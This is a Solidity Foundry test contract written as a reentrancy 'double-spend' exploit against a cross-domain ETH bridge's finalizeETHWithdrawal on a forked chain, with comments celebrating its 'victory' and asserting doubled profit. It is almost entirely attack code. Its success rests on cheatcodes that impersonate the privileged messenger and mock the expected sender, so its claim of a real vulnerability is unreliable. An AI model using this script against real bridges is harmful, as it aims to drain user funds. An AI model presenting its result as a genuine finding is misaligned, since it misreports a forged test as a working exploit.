// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// The original contract that brought us victory. No more clever changes.
contract MichaelEmpireCrusher is Test {
    address payable private constant L1_STANDARD_BRIDGE = payable(0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1);
    address private constant L1_CROSS_DOMAIN_MESSENGER = 0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1;
    address private constant L2_BRIDGE_EXPECTED_SENDER = 0x4200000000000000000000000000000000000010;
    uint256 public constant ATTACK_AMOUNT = 0.1 ether;
    uint256 public reentrancyCount = 0;

    function setUp() public {
        // The fork is selected via the command line --fork-url flag
        vm.deal(address(this), 1 ether);
        vm.deal(L1_CROSS_DOMAIN_MESSENGER, 1 ether);
    }

    receive() external payable {
        if (msg.sender == L1_STANDARD_BRIDGE && reentrancyCount == 0) {
            reentrancyCount++;
            console.log("   >> Re-entrancy Hook Triggered! The original strategy works!");

            vm.stopPrank();
            vm.prank(L1_CROSS_DOMAIN_MESSENGER);

            vm.mockCall(
                L1_CROSS_DOMAIN_MESSENGER,
                abi.encodeWithSignature("xDomainMessageSender()"),
                abi.encode(L2_BRIDGE_EXPECTED_SENDER)
            );

            (bool success, ) = L1_STANDARD_BRIDGE.call{value: ATTACK_AMOUNT}(
                abi.encodeWithSignature(
                    "finalizeETHWithdrawal(address,address,uint256,bytes)",
                    address(this), address(this), ATTACK_AMOUNT, ""
                )
            );
            require(success, "Re-entrancy call failed!");
        }
    }

    // The original test function that starts with 'test'.
    function test_ExploitDoubleSpendVulnerability() public {
        console.log("--- Re-running the Original, Successful Test ---");
        uint256 balanceBefore = address(this).balance;

        vm.prank(L1_CROSS_DOMAIN_MESSENGER);
        vm.mockCall(
            L1_CROSS_DOMAIN_MESSENGER,
            abi.encodeWithSignature("xDomainMessageSender()"),
            abi.encode(L2_BRIDGE_EXPECTED_SENDER)
        );

        (bool success, ) = L1_STANDARD_BRIDGE.call{value: ATTACK_AMOUNT}(
            abi.encodeWithSignature(
                "finalizeETHWithdrawal(address,address,uint256,bytes)",
                address(this), address(this), ATTACK_AMOUNT, ""
            )
        );
        require(success, "Initial bridge call failed");

        uint256 profit = address(this).balance - balanceBefore;

        console.log("--- VERIFICATION ---");
        console.log("Final Profit (Wei):", profit);
        assertEq(profit, 2 * ATTACK_AMOUNT, "THE ORIGINAL STRATEGY FAILED!");
        console.log("--- SUCCESS! THE ORIGINAL STRATEGY IS THE TRUE VICTORY! ---");
    }
}
